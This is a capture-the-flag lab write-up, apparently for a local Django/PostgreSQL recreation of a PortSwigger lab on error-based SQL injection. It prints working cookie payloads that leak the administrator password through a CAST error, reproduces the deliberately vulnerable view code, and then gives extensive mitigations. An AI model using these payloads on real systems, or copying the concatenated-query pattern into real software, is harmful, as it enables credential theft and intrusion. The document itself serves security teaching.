# Lab 13 — SQL injection with visible error-based data exfiltration

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based> |
| Lab id | `psw-sqli-13-visible-error-based` |
| Vulnerability class | SQL Injection — visible error-based exfiltration (verbose DB error reflected to client) |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) / [CWE-209 — Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html) |
| Backend | PostgreSQL 16 (two-service compose — `web` + `db`) |
| Host URL | <http://127.0.0.1:18013/> |
| Flag | `FLAG{psw-sqli-13-visible-error-based-admin-access}` |

### Objective

The home page executes a `tracked_users` lookup keyed on the `TrackingId` cookie. The row itself never reaches the UI, but whenever the query raises a driver-level exception, the **raw `str(exc)` text is rendered inside a `<div class="db-error">`**. Because the backend is PostgreSQL and `CAST(... AS INT)` embeds the rejected operand inside the error string (`invalid input syntax for type integer: "..."`), a single crafted cookie leaks any scalar the attacker picks — here, the administrator's `secrets.token_urlsafe(16)` password. The attacker then signs in at `/login` and visits `/my-account` to capture the flag.

---

## 2. Exploit walkthrough

The `TrackingId` cookie is concatenated into a single-quoted literal. The attacker closes the literal, injects a boolean conjunct whose right-hand side is a forced `CAST ... AS INT`, and trails `--` to discard the closing quote. The cast fails, PostgreSQL raises `InvalidTextRepresentation`, and Django's wrapper exception text — which includes the full operand — is echoed back into the page.

**Step 1 — baseline request (benign)**

```http
GET / HTTP/1.1
Host: 127.0.0.1:18013
Cookie: TrackingId=psw-lab-visitor-001
```

Executed SQL:

```sql
SELECT tracking_id FROM tracked_users WHERE tracking_id = 'psw-lab-visitor-001'
```

One row matches, no exception is raised, `error_message` stays `None`, and nothing is rendered in the `db-error` block.

**Step 2 — confirm the error channel with a deliberately broken cast**

```http
GET / HTTP/1.1
Host: 127.0.0.1:18013
Cookie: TrackingId=x' AND 1=CAST('abc' AS INT)--
```

The server builds and runs:

```sql
SELECT tracking_id FROM tracked_users WHERE tracking_id = 'x' AND 1=CAST('abc' AS INT)--'
```

The response body now contains:

```
Database error:
invalid input syntax for type integer: "abc"
LINE 1: ...tracked_users WHERE tracking_id = 'x' AND 1=CAST('abc' AS IN...
```

The channel is confirmed — the literal operand `abc` appears verbatim inside the rendered error text.

**Step 3 — replace the constant with a subquery to exfiltrate the admin password**

```http
GET / HTTP/1.1
Host: 127.0.0.1:18013
Cookie: TrackingId=x' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS INT)--
```

PostgreSQL evaluates the subquery first, hands the resulting text to `CAST(... AS INT)`, and raises:

```
invalid input syntax for type integer: "h3pl4y3rXyz_ABC-123"
```

That `"..."` fragment is the output of `secrets.token_urlsafe(16)` seeded in [shop/management/commands/seed.py:39](shop/management/commands/seed.py#L39). One request, full password leaked.

**Step 4 — authenticate and collect the flag**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:18013
Content-Type: application/x-www-form-urlencoded

username=administrator&password=h3pl4y3rXyz_ABC-123
```

The `/login` endpoint uses the ORM and is not injectable ([shop/views.py:104](shop/views.py#L104)), so only the genuine password logs in. `/my-account` then sees `is_admin=True` and reveals `FLAG{psw-sqli-13-visible-error-based-admin-access}`.

---

## 3. Vulnerable code

### Endpoint: `GET /`

[shop/views.py:52-70](shop/views.py#L52-L70)

```python
def home(request: HttpRequest) -> HttpResponse:
    tracking_id = request.COOKIES.get("TrackingId")

    error_message = None
    if tracking_id is not None:
        query = (
            "SELECT tracking_id FROM tracked_users "
            "WHERE tracking_id = '" + tracking_id + "'"
        )
        try:
            with connection.cursor() as cursor:
                cursor.execute(query)
                cursor.fetchall()
        except Exception as exc:
            error_message = str(exc)
```

Three separate defects compound:

1. The `TrackingId` cookie (fully attacker-controlled) is concatenated into the SQL text on lines 61-64 with no escaping and no parameter binding.
2. `cursor.execute(query)` on line 67 is invoked with a single pre-composed string, so the psycopg driver has no chance to distinguish code from data.
3. The bare `except Exception as exc` on line 69 captures the driver's fully-rendered error message — including the failed-cast operand — and assigns it to `error_message` without sanitisation.

### Reflection sink

[shop/templates/shop/home.html:5-8](shop/templates/shop/home.html#L5-L8)

```django
{% if error_message %}
    <div class="db-error"><strong>Database error:</strong>
{{ error_message }}</div>
{% endif %}
```

The value is rendered on every request whenever the query threw. This is the side channel: without it the bug is still a raw-SQL injection but the data path is closed; with it any scalar the attacker can embed in a `CAST` operand can be read in one round trip.

### Backend selection

[sqli_lab/settings.py:54-63](sqli_lab/settings.py#L54-L63) and [docker-compose.yml:4-11](docker-compose.yml#L4-L11) — `ENGINE` is `django.db.backends.postgresql` pointing at a `postgres:16-alpine` service. PostgreSQL is essential: SQLite coerces failing casts silently to `0` and would not produce the "invalid input syntax for type integer" payload that carries the leaked text.

### Safe control surface (contrast)

[shop/views.py:99-113](shop/views.py#L99-L113) — the `/login` POST handler uses `User.objects.filter(username=..., password=...)`, which Django compiles into a parameterised query. The attacker cannot bypass authentication; they must recover the real password via the error channel above.

### Seeded data

[shop/management/commands/seed.py:39-44](shop/management/commands/seed.py#L39-L44) — administrator password is `secrets.token_urlsafe(16)`, deliberately high-entropy. Conditional-response or boolean-blind techniques would require hundreds of requests to recover it one character at a time; the visible-error channel reads it whole in a single response, which is the teaching point.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of an attacker-controlled cookie into raw SQL** | Classic SQLi primitive — quotes and comments inside `TrackingId` rewrite the query. |
| **Catch-all `except Exception as exc` that reads `str(exc)`** | The DB driver's verbose message (which on PostgreSQL embeds operand values from failing casts) leaves the persistence layer intact. |
| **Template renders the captured error text verbatim** | Converts a server-side log-worthy event into a client-visible oracle. |
| **PostgreSQL backend** | PG's `invalid input syntax for type integer: "..."` is ideal for exfiltration — the full offending scalar is quoted back. MySQL's `DOUBLE`/`EXTRACTVALUE` gadgets and MSSQL's conversion errors behave similarly. |
| **Administrator password is a single high-entropy scalar** | One `CAST(SELECT ... AS INT)` leaks it in one request — no character-by-character oracle loop needed. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the lookup

Bind the cookie value, do not concatenate:

```python
# shop/views.py — fixed
query = "SELECT tracking_id FROM tracked_users WHERE tracking_id = %s"
with connection.cursor() as cursor:
    cursor.execute(query, [tracking_id])
    cursor.fetchall()
```

Better still, drop the raw SQL and use the ORM:

```python
from .models import TrackedUser
TrackedUser.objects.filter(tracking_id=tracking_id).exists()
```

With the value bound, `x' AND 1=CAST(... AS INT)--` is matched *literally* against `tracking_id` and no cast is ever attempted.

### 5.2 Stop reflecting exception text

The template block in [shop/templates/shop/home.html:5-8](shop/templates/shop/home.html#L5-L8) is the proximate cause of the leak. Remove it. If the application must surface an error to the user, show a stable, generic string and push the driver text to the server log:

```python
import logging
log = logging.getLogger(__name__)

try:
    with connection.cursor() as cursor:
        cursor.execute(query, [tracking_id])
        cursor.fetchall()
except Exception:
    log.exception("tracked_users lookup failed")
    error_message = "We could not complete your request. Please try again later."
```

Pair this with a custom `handler500` that renders a static page — never a stack trace — even when `DEBUG=False` lets something slip through.

### 5.3 Narrow the exception surface

`except Exception` is too wide. Catch `django.db.DatabaseError` (or `psycopg.Error`) explicitly, and let unrelated bugs propagate to the framework's 500 handler:

```python
from django.db import DatabaseError
try:
    ...
except DatabaseError:
    log.exception("tracked_users lookup failed")
    error_message = "Tracking lookup temporarily unavailable."
```

### 5.4 Validate the cookie shape

`TrackingId` is an opaque server-minted token. Reject anything that does not match the expected charset before it gets anywhere near SQL:

```python
import re
TRACKING_RE = re.compile(r"\A[A-Za-z0-9_-]{1,64}\Z")

tracking_id = request.COOKIES.get("TrackingId", "")
if not TRACKING_RE.fullmatch(tracking_id):
    tracking_id = None   # treat as absent
```

This is pure defense-in-depth — parameterisation already kills the injection — but it also stops log-poisoning and header-smuggling with weird bytes.

### 5.5 Sign or HMAC the cookie

If the tracking ID is issued by the server, there is no reason to accept any value the client hands back. Use `django.core.signing` (or switch to a `SessionMiddleware`-managed identifier). Tampered or rotated cookies then fail signature verification before any DB query runs.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Web Application Firewall (WAF)

Deploy a WAF with the OWASP Core Rule Set in front of the app. Rules most relevant to this lab:

- `REQUEST-942` — SQL injection detection (flags `' AND`, `UNION SELECT`, `CAST(`, `SELECT ... FROM users`, `--` terminators).
- `REQUEST-920` — protocol enforcement (oversize cookies, invalid encodings).
- `RESPONSE-951` — database error disclosure in response bodies (matches PostgreSQL strings like `invalid input syntax for type`, `ERROR: syntax error at or near`, `relation ... does not exist`). Enabling this **response-side** rule is particularly valuable here: it catches the leak even if the injection sneaks past the request-side rules.

Treat the WAF as one layer. Rule bypasses for `CAST`/`CONVERT` gadgets are well documented.

### 6.2 Least-privilege PostgreSQL role

The app's `labuser` role today is the owner of the schema (see [docker-compose.yml:10-11](docker-compose.yml#L10-L11)). In production:

- Create a dedicated application role with `SELECT`/`INSERT`/`UPDATE` only on the tables it must touch.
- Revoke `CREATE`, `ALTER`, `DROP`, and access to system catalogs (`pg_shadow`, `pg_authid`, `pg_proc`).
- Deny `COPY PROGRAM` and any `pg_read_server_files`/`pg_write_server_files` role memberships.
- Put the `users.password` column out of reach — either move credentials behind a server-side function that returns only a boolean (`SELECT verify_password($1, $2)`) or store Argon2/bcrypt hashes so even a successful leak yields a hash, not a plaintext.

### 6.3 Error-channel hardening at the platform edge

- Set `DEBUG=False` in every non-local environment (already the case in [sqli_lab/settings.py:20](sqli_lab/settings.py#L20)) and install a reverse proxy that strips any 500 body and serves a static error page.
- Configure PostgreSQL's `log_min_error_statement = error` to capture the offending query server-side without echoing it to the client.
- Turn on `pg_stat_statements` and alert on high-cardinality query shapes — an injected `CAST(SELECT password ...)` produces a distinct normalised statement that should never appear from a `/` handler.

### 6.4 Network segmentation

- The compose file binds only `127.0.0.1:18013:8000` ([docker-compose.yml:33-34](docker-compose.yml#L33-L34)); the DB is reachable only on the internal `psw-sqli-13-visible-error-based-net` bridge. That isolation is the baseline — replicate it in production (DB on a private subnet, no public Listener).
- Block egress from the `db` container so even post-exploitation primitives like `COPY TO PROGRAM` cannot reach the internet.

### 6.5 Monitoring & rate limiting

- Rate-limit `/` by IP and by cookie. A burst of distinct `TrackingId` values from one source is a strong indicator of automated exfiltration.
- Alert on any 200 response whose body matches `invalid input syntax for type integer` or `ERROR:  syntax error at or near` — those strings should never ship to a user.
- Structured-log every `DatabaseError` with the originating URL, client IP, and a redacted cookie fingerprint.

---

## 7. Defense-in-depth checklist

- [ ] Every `cursor.execute(...)` uses a parameter list — no `+`, `%`, or f-strings building SQL.
- [ ] ORM by default; raw SQL only where reviewed.
- [ ] Database exceptions are logged server-side and replaced with a generic user-facing message before reaching the template.
- [ ] No template renders `str(exc)` or any driver-supplied string.
- [ ] `DEBUG=False` and a custom 500 handler in every non-dev environment.
- [ ] `except Exception` narrowed to `DatabaseError` / `psycopg.Error` where appropriate.
- [ ] Cookies that act as identifiers are signed or HMAC'd.
- [ ] Allow-list validation on server-minted opaque tokens (charset + length).
- [ ] Separate least-privilege DB role per application; no DDL, no superuser.
- [ ] Passwords stored as Argon2/bcrypt hashes — plaintext leaks yield hashes, not credentials.
- [ ] WAF with request-side SQLi rules **and** response-side DB-error rules.
- [ ] `pg_stat_statements` review with alerts on anomalous normalised statements.
- [ ] SAST (bandit, semgrep) rule for `cursor.execute("..." + x)` and `cursor.execute(f"...")`.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection with visible error-based data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- OWASP — [Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- CWE-209 — <https://cwe.mitre.org/data/definitions/209.html>
- PostgreSQL docs — [Type conversion and `CAST`](https://www.postgresql.org/docs/current/sql-expressions.html#SQL-SYNTAX-TYPE-CASTS)
- Django docs — [Performing raw SQL queries](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly) (see the warning on parameter substitution)
- OWASP CRS — <https://coreruleset.org/>
